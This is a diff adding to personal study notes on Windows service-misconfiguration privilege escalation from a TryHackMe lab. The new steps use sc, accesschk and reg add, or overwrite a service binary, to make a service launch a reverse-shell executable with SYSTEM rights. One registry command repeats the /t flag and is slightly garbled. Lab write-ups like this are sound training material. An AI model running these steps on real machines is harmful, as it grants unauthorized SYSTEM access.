@@ -124,6 +124,8 @@ Common Service Misconfiguration:
 4. Insecure Service Executables
 5. DLL Hijacking
 
+# Definitions
+
 1. Insecure Service Properties
 Each service has an ACL which defines certain service-specific permissions. We can change the executable of a service, which runs with SYSTEM privileges. But in case the START/STOP service is disabled then attacker could not escalate the privilege.
 
@@ -133,7 +135,13 @@ Executables in Windows can be run without using their extension (whoami.exe to w
 3. Weak Registry Permissions
 The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service's configuration even if we cannot modify a service.
 
-4. 
+4. Insecure Service Executable
+If the original service executable is modifiable by a user, we can simply replace it with our reverse shell executable  
+
+5. DLL Hijacking 
+
+A service will try to load functionality from a library called a DLL. Whatever functionality the DLL provides, will be executed with the same privilges as the service that loaded it. Needed absolute path (the complete, explicit location of a file or directory, starting from the root of the file system)
+
 # TryHackMe - Windows PrivEsc
 
 # Task 3 (Service Exploits)
@@ -148,4 +156,23 @@ Question: What is the BINARY_PATH_NAME of the unquotedsvc service?
 
 Answer:  C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
 
-# Task 5 (Service Exploits)
+# Task 5 (Service Exploits) Weak Registry Permissions
+Get the shell as NT system/authority
+
+Query the 'regsvc' with a command: ``` sc qc regsvc ```
+
+Using accesschk.exe, check the entry for regsvc is writable byNT Authority\Interactive: ```C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc ```  
+
+Overwrite the ImagePath: ``` reg add HKLM\System\CurrentControlSet\Services\regsvc /v ImagePath /t ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f ```
+
+Start the service: ``` net start regsvc ```
+
+# Task 6 (Service Exploits) Insecure Service Executables
+
+Query the "filepermsvc" service: ``` sc qc filepermsvc```
+
+Using accesschk.exe, the service binary is writable by everyone: ```C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"```
+
+Copy the reverse shell and replace it: ```copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y```
+
+Run the SYSTEM privileges: ```net start filepermsvc```
